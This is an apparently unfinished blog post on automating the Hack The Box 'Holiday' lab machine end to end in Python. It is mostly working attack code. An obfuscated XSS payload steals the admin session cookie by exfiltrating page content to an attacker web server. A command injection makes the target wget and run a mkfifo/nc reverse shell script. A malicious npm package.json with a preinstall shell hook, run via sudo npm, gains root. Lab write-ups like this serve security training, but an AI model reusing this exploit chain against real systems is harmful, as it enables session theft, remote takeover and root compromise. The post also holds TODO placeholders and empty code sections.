---
layout: post
title:  "Hack The Box - Holiday - Automated Exploitation"
date:   2021-11-27 7:00:00 +0200
tags: ["Hack The Box","OSWE","Pentesting Tips & Tricks"]
---

# Introduction
The hack the box machine "Holidays" is a hard machine which requires knowledge in the areas of user agent filtering, SQL injections, XSS filter evasion, command injection and NodeJS packages. In this post, we study write an end to end exploit with python which can perform all the exploitation steps from no 

<img style="Width:550px;" src="/assets/2021-11-27-HTB-Holidays-Automated-Exploitation/card.png" alt="HolidayCard">

The next section contains a summary of the exploitation process while the subsequent section contains a description of how to write the exploit. For a more thorough description of the exploitation process, see the 
<a class="site-title" href="{{ "/tags" | relative_url }}">previous post on this hackthebox machine</a>.
The goal of this post is to create a python script which can automatically exploit the target.
Note that this script has to be executed with sudo since it needs to start the web server on port 80 which is a restricted port. The reason why another port can't be used is that the command injection vulnerability does not allow for the colon character `:`

TODO: Video

# Summary of the Exploitation
Log in with the username "rickA" and password "nevergonnagiveyouup". start a web server. Inject an xss payload to leak the admin session cookie. Use the admin session cookie to login to the web site and exploit a table lookup feature to achieve remote code execution. Then, abuse sudo privileges on NPM packages to 

For a more detailed overview, see the previous post `x`

In short, this is what has to be automated:

Note that the sqli step can be skipped since we already have the credentials of rickA

SQLI to get creds is out of scope

TODO: Create table of threads?

* Import modules and initialize variables
* Prepare exploit files which will be served with a web server
* Create a web server handler
* Start the web server in a second thread
* Login with the already compromised credentials to get a session cookie
* Use the session cookie to post an XSS payload in a booking note
* Wait for the admin to browse to the XSS payload to steal his session
* Exploit the command injection vulnerability and get a shell on the target
* Perform a privilege escalation to root

| Thread 1 | Thread 2 | Thread 3|
| -------- | -------- |
| Prepare exploit files | - |
| Wait for thread 2 | Start a web server |
| -  | Listen for web requests | 
| - | accept connection and deliver "x.js" |
| - | Get admin session token| 
| | | Listen for web requests |
| | |
| | |
| | |

# Writing the Exploit
The listener was taken from (earlier post) and adapted with multithreading and delays

This exploit requires the usage of threads, mutexes and several listeners. For an explanation of the listener, see x.

we need x

we start by importing the relevant libraries and defining constants, as shown below. Note that the `threading` module is required for multi-threading.
TODO: Explain libraries?
{% highlight python linenos %}
import base64, contextlib, http.server, ipaddress, os, re, requests, socket, socketserver, sys, threading, time
LHOST = "10.10.14.25"   #CHANGE THIS
LPORT = 9000
RHOST = "10.10.10.25"
RPORT = 8000
wsDir = "/tmp/z" #Web server directory
URLBASE = "http://"+RHOST+":"+str(RPORT)+"/"
{% endhighlight %}

{% highlight python linenos %}
#Initialize web server files
os.popen("rm -rf "+wsDir+";mkdir "+wsDir).read() #Use read() to wait for the command to finish executing

XJS = """req1 = new XMLHttpRequest();
req1.open("GET","http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65",false);
req1.send();
req2 = new XMLHttpRequest();
req2.open("GET","http://"""+LHOST+"""/leak?x="+btoa(req1.responseText),false);
req2.send();
"""
RS = """#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc """+LHOST+" "+str(LPORT)+" >/tmp/f"

with open(wsDir+"/x.js","w") as f:
    f.write(XJS)
with open(wsDir+"/rs","w") as f:
    f.write(RS)
{% endhighlight %}

{% highlight python linenos %}
class wsHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.dirHandler = super().__init__(*args, directory=wsDir, **kwargs)

    def do_GET(self):
        global webServerRunning,cookieValue #Used to kill the web server and return the extracted cookie value
        if self.path.startswith("/leak"):
            m = re.search("\?x=(.*)$",self.path) #Get base64 encoded response
            b = base64.b64decode(m.group(1))
            m = re.search("""name=\"cookie" value=\"connect.sid&#x3D;(.*?)\">""",str(b)) #Search base64 decoded string
            cookieValue = m.group(1)
            wsMutex.release()

        elif self.path.startswith("/rs"):
            print("[*] Sending reverse shell payload")
            super().do_GET()
            webServerRunning = False

        else:
            super().do_GET()
{% endhighlight %}

{% highlight python linenos %}
#startWebServer - Starts a web server capable of delivering reverse shell payloads and leaking session cookies
def startWebServer():
    global webServerRunning
    webServerRunning = True

    with socketserver.TCPServer(("",80), wsHandler) as httpd:
        print("[*] Starting web server")
        while webServerRunning:
            httpd.handle_request()
        print("[*] Stopping web server")

#Start the web server to serve x.js and leak the admin's session cookie
wsMutex = threading.Lock()
wsMutex.acquire()
webserverThread = threading.Thread(target=startWebServer)
webserverThread.start()
{% endhighlight %}

{% highlight python linenos %}
#Send a login request
data = {"username":"RickA","password":"nevergonnagiveyouup"}
headers = {"User-Agent":"Linux"}
r = requests.post(URLBASE+"login", data=data, headers=headers, allow_redirects=False)
cookie = r.headers['set-cookie']

#Get the session cookie from the response
m = re.search("connect\.sid=(.*?);",cookie)
cookieName = "connect.sid"
cookieValue = m.group(1)
{% endhighlight %}

{% highlight python linenos %}
#Send a request for the /agent page to get a booking ID
headers['Cookie'] = cookieName+"="+cookieValue
r = requests.get(URLBASE+"agent", headers=headers)
m = re.search("""href=\"/vac/([0-9,a-z,\-]*)\">""",r.text)
BookingID = m.group(1)
{% endhighlight %}

{% highlight python linenos %}
#Send an evil note that will request x.js from the web server
print("[*] Sending XSS payload")
payload = """document.write('<script src="http://"""+LHOST+"""/x.js"></script>')"""
nums = [str(ord(i)) for i in payload]
payload = '<img src="x/><script>eval(String.fromCharCode('+','.join(nums)+'));</script>">'
data = {"uuid":BookingID,"body":payload}
r = requests.post(URLBASE+"agent/addNote", headers=headers, data=data)

#Wait for the admin session cookie before proceeding
print("[*] Waiting for the administrator to browse the infected note")
wsMutex.acquire()
headers['Cookie'] = cookieName+"="+cookieValue
{% endhighlight %}

{% highlight python linenos %}
# executeRevShell - Executes a reverse shell on the target by abusing the command injection vulnerability
# Params:
#   urlbase - The URL of the target to compromise
#   wsIP - IP of the webserver which hosts the reverse shell payload "rs"
#   mutex(opt) - A mutex to acquire before exploiting the target
#   headers(opt) - Headers to send with the command injection attempts
def executeRevShell(urlbase, wsIP, mutex=None,headers={}):
    if mutex!=None:
        mutex.acquire()

    #convert Ip to dec format
    ipDec = int(ipaddress.ip_address(wsIP))

    print("[*] Instructing the target to download the rs payload")
    with contextlib.suppress(requests.exceptions.ReadTimeout):
        requests.get(urlbase+"admin/export?table=x%26wget%20"+str(ipDec)+"%2frs", headers=headers, timeout=0.5)
        requests.get(urlbase+"admin/export?table=x%26bash%20rs", headers=headers, timeout=0.5)
{% endhighlight %}

{% highlight python linenos %}
#listener - Creates a listener which can catch a reverse shell
#Params:
#   ip - IP address to listen on
#   port - Port to listen on
#   commands(opt) - Commands to execute before creating an interactive shell
#   lock(opt) - A mutex to release after binding to the specified ip and port
def listener(ip,port,commands=[],mutex=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("[*] Listening on port " + str(port))
    if mutex != None:
        mutex.release()

    conn, addr = s.accept()
    print('[*] Connection received from ',addr)
    defaultSleepTime = 1 #Time to wait for command output before returning, Measured in seconds
    sleepTime = defaultSleepTime
    while True:

        #Receive data from the target and execute commands
        ans = conn.recv(1024).decode()
        if commands:
            command = commands[0]
            commands = commands[1:]
            if not commands: #If this command is the last command
                sleepTime = 4 #Wait 4 seconds to ensure that all commands have been fully exectued before getting their output
        else:
            sys.stdout.write(ans)
            command = input()
            #Remove the output of the "input()" function
            sys.stdout.write("\033[A\033[F"+ans.split("\n")[-1])

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(sleepTime) #Wait a second before retreiving the output of the command
        sleepTime = defaultSleepTime
{% endhighlight %}

{% highlight python linenos %}
rsMutex = threading.Lock()
rsMutex.acquire()
rsThread = threading.Thread(target=executeRevShell,args=(URLBASE,LHOST,rsMutex,headers))
rsThread.start()
{% endhighlight %}

{% highlight python linenos %}
#Prepare a list with privesc commands to compromise the root account
#cat package.json | base64 -w 0
packageJSON = "ewogICJuYW1lIjogInByaXZlc2NQYWNrYWdlIiwKICAidmVyc2lvbiI6ICIxLjAuMCIsCiAgIm1haW4iOiAiaW5kZXguanMiLAogICJzY3JpcHRzIjogewogICAgInByZWluc3RhbGwiOiAiL2Jpbi9iYXNoIC1pIgogIH0KfQo="
privescCommands = ["mkdir ./privescPackage","echo '" + packageJSON + "' | base64 -d > privescPackage/package.json","sudo npm i privescPackage --unsafe"]
listener(LHOST,LPORT,privescCommands,mutex=rsMutex)
{% endhighlight %}


{% highlight python linenos %}
{% endhighlight %}



# Final Code

{% highlight python linenos %}
{% endhighlight %}
